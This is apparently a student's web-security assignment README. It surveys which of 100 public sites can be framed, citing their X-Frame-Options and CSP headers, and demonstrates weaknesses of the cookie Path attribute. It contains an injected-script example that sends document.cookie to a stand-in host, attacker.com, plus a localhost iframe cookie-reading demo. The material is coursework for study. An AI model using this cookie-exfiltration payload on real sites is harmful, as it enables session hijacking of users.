## Assignment 4 - Kumushini(01251889)

## Question 1 - Which public sites are framable

### List of directories and files

* [HTTP_reponse_headers](HTTP_reponse_headers) - contains response headers obtained for 100 sites.
* [code](code) - contains scripts and output files used to analyze which sites are framable.
* [framable](framable) - contains html files created for 100 sites.

### Youtube video for framable is available at: https://youtu.be/QLgFOZIHSOI

### Summary

* Number of framable sites - 28
* Number of non framable sites - 69
* number of sites did not resolve - 3

* Framable sites out of 100 sites

|    | Site                |
|---:|:--------------------|
|  0 | adobe.com           |
|  1 | alexa.com           |
|  2 | apnews.com          |
|  3 | asahi.com           |
|  4 | biblegateway.com    |
|  5 | bloomberg.com       |
|  6 | bustle.com          |
|  7 | doubleclick.net     |
|  8 | economist.com       |
|  9 | estadao.com.br      |
| 10 | focus.de            |
| 11 | frontiersin.org     |
| 12 | id.wikipedia.org    |
| 13 | iso.org             |
| 14 | ja.wikipedia.org    |
| 15 | m.wikipedia.org     |
| 16 | nginx.org           |
| 17 | photobucket.com     |
| 18 | rbc.ru              |
| 19 | repubblica.it       |
| 20 | shutterstock.com    |
| 21 | springer.com        |
| 22 | theatlantic.com     |
| 23 | un.org              |
| 24 | venturebeat.com     |
| 25 | webmd.com           |
| 26 | wikimedia.org       |
| 27 | www.livejournal.com |


* Screenshot of a framable site

<kbd><img src="screenshots/iframe_loaded.png" width="700" ></kbd>


  * Non framable sites with reason

|    | Site                  | Reason                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
|---:|:----------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
|  0 | addthis.com           | x-frame-options: sameorigin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  1 | amazon.co.jp          | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  2 | amazon.es             | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  3 | apache.org            | content-security-policy: default-src 'self' 'unsafe-inline' https://www.apachecon.com/ https://analytics.apache.org/ http://analytics.apache.org/ https://www.google.com/cse/ https://cse.google.com/ https://www.googleapis.com/generate_204 http://*.google.com/generate_204 https://afs.googlesyndication.com/ https://csp.withgoogle.com/ https://www.google.com/images/ https://ssl.gstatic.com/ui/ https://docs.google.com/forms/ https://www.youtube.com/embed/; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://analytics.apache.org/ http://analytics.apache.org/ https://cse.google.com/ http://cse.google.com/adsense/search/async-ads.js https://www.google.com/cse/ https://partner.googleadservices.com/; style-src 'self' 'unsafe-inline' https://www.google.com/cse/; frame-ancestors 'none'; |
|  4 | berkeley.edu          | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  5 | change.org            | x-frame-options: sameorigin                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  6 | channel4.com          | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  7 | cloudflare.com        | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  8 | cointernet.com.co     | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
|  9 | dreamstime.com        | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 10 | ea.com                | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 11 | fifa.com              | 401                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 12 | ftc.gov               | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 13 | goodreads.com         | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 14 | google.co.id          | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 15 | google.co.th          | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 16 | google.fr             | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 17 | groups.google.com     | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 18 | gstatic.com           | 404                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 19 | hatena.ne.jp          | X-Frame-Options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 20 | hp.com                | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 21 | huffingtonpost.com    | content-security-policy: sandbox allow-forms allow-same-origin allow-scripts allow-popups allow-popups-to-escape-sandbox allow-presentation allow-top-navigation-by-user-activation; frame-ancestors 'self' *.huffpost.com *.huffingtonpost.com *.huffpost.net *.buzzfeed.com clients.opinary.com compass.pressekompass.net *.newsbreak.com *.newsbreakapp.com *.upday-content.com *.upday.com; report-uri https://huffpost.report-uri.com/r/d/csp/enforce;                                                                                                                                                                                                                                                                                                                                                           |
| 22 | hugedomains.com       | x-frame-options: ALLOW-FROM https://hugedomains.com/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 23 | ikea.com              | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 24 | jhu.edu               | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 25 | lemonde.fr            | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 26 | m.me                  | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 27 | mail.google.com       | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 28 | medium.com            | content-security-policy: frame-ancestors 'self' https://medium.com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 29 | msn.com               | 404                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 30 | news.google.com       | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 31 | nikkei.com            | content-security-policy: frame-ancestors 'self'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| 32 | outlook.com           | 440                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 33 | ovh.co.uk             | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 34 | pbs.org               | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 35 | pexels.com            | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 36 | picasaweb.google.com  | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 37 | pixabay.com           | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 38 | playstation.com       | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 39 | reddit.com            | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 40 | rollingstone.com      | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 41 | samsung.com           | 403                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 42 | sciencedirect.com     | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 43 | scmp.com              | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 44 | sendspace.com         | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 45 | surveymonkey.com      | Content-Security-Policy: default-src https: data: blob: 'unsafe-eval' 'unsafe-inline' https://www.google.com https://www.gstatic.com https://www.recaptcha.net https://api.amplitude.com https://api2.amplitude.com wss://*.hotjar.com wss://*.qualified.com 'self'; upgrade-insecure-requests; frame-ancestors 'self' https://*.zendesk.com https://*.myshopify.com https://teams.microsoft.com https://*.eloqua.com https://*.surveymonkey.com https://*.sharepoint.com https://*.worldpay.com https://*.cardinalcommerce.com https://*.office.com https://*.office365.com https://*.microsoft365.com;                                                                                                                                                                                                              |
| 46 | t.me                  | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 47 | telegram.me           | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 48 | tiktok.com            | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 49 | twitch.tv             | X-Frame-Options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 50 | unsplash.com          | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 51 | uol.com.br            | content-security-policy: frame-ancestors 'self' *.intranet *.uolinc.com;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| 52 | utexas.edu            | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 53 | vkontakte.ru          | 418                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 54 | w3.org                | content-security-policy: frame-ancestors 'self' https://cms.w3.org/; upgrade-insecure-requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| 55 | wa.me                 | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 56 | weather.com           | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 57 | webnode.page          | x-frame-options: DENY                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| 58 | weibo.com             | nan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 59 | who.int               | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 60 | wikia.com             | nan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 61 | windows.net           | 403                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 62 | wsj.com               | 404                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 63 | yadi.sk               | nan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 64 | yahoo.co.jp           | nan                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 65 | yandex.ru             | Content-Security-Policy: frame-ancestors sq2.go.mail.ru metrika.yandex.ru webvisor.com; report-uri https://csp.yandex.net/csp?from=zen_old&project=zen&yandex_login=&yandexuid=2925298041698793241&requestid=3806593210.232.1698793241538.57436&page=site_desktop;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 66 | youronlinechoices.com | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 67 | youtu.be              | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 68 | zdf.de                | x-frame-options: SAMEORIGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |



* Within the non-framable category, four sites were observed wihtout a proper reason to explain that how they defeat the attempt for framing. The four sites with reason "nan" have not set x-frame-options, content security policy, and no status code was observed which prevent the page loading inside the iframe.

* Screenshot of a non-framable site

<kbd><img src="screenshots/iframe_not_loaded.png" width="700" ></kbd>


 ## Question 2 - Frame path attack
 
 ### How the Path attribute for Cookies is not suitable for security

 **Example for limited protection against cross-site-scripting attacks.**

   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon 
user login.

  ***Set-Cookie: sessionId=123; Path=/user***
   
   In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the 
   "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.

 * Insecure html page

 ```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Insecure Page</title>
</head>
<body>
    <h1>Welcome to our website!</h1>
    <script>
        // Simulating a malicious script injected by an attacker
        const img = new Image();
        img.src = "https://attacker.com/steal?cookie=" + document.cookie;
    </script>
</body>
</html>
 ```

 **Example futher explained**
 
- The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
- Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
- The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker *(https://attacker.com/steal?cookie= + document.cookie)* .
- When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.

  
 ### How a parent page can steal cookies from an iframed page if only the Path attribute is used in Set-Cookie.

 ### List of files

 * [child.html](frame-path-attack/child.html) - html page with a cookie and which is being framed by parent page
 * [parent.html](frame-path-attack/parent.html) - html page which steal cookie from child page
 * [index_c.js](frame-path-attack/index_c.js) - server used to render child.html
 * [index_p.js](frame-path-attack/index_p.js) - server used to render parent.html

 ### Youtube video for frame-path-attack is available at: https://youtu.be/FRpULEejpPA   

 * child.html page with a cookie having path attribute.


  ```
   <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Iframed Page</title>
</head>

<body>
    <h1>Child page</h1>
    <script>
        document.cookie = "insecureCookie=456; Path=/";
    </script>
</body>

</html>
  ```

   
 * parent.html page trying to steal the cookie by framing child.html
   

 ```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Parent Page</title>
</head>

<body>
    <h1>Parent page</h1>
    <iframe src="http://localhost:8001"></iframe>
    <script>
        // Attempt to read cookies from the iframed page
        const cookies = document.cookie;
        console.log("cookies found");
        alert("cookies found");
        console.log("Cookies from iframed page:", cookies);

    </script>
</body>

</html>
 ```

 * Screenshot of child.html
   
 <kbd><img src="screenshots/child_page_with_cookie.png" width="700" ></kbd>

 * Screenshot of parent.html with stolen cookie.

  <kbd><img src="screenshots/parent_page with _stolen_cookie.png" width="700" ></kbd>

  ### Extra credit - Week 5 slide 65 literary reference in the title

  In programming parser is a module or a component in the software that analyses the structure and the syntax of a source code or input data. Parsing is commonly used in compilers, intepreters, and data validation. 
  
  The slide reference is mainly focused on syntax analysis of input data. When a parser runs the input will be tokenized and tokens are then organized in a hierarchical structure.
  
  When building applications, first the HTML parser runs and search for the valid html tags and create the DOM(Document Objject Model) tree. Then the javascript parser runs and search for <script> tags and executes them. next CSS parser runs and search for <style> tags and execute the <style > tags accordingly.
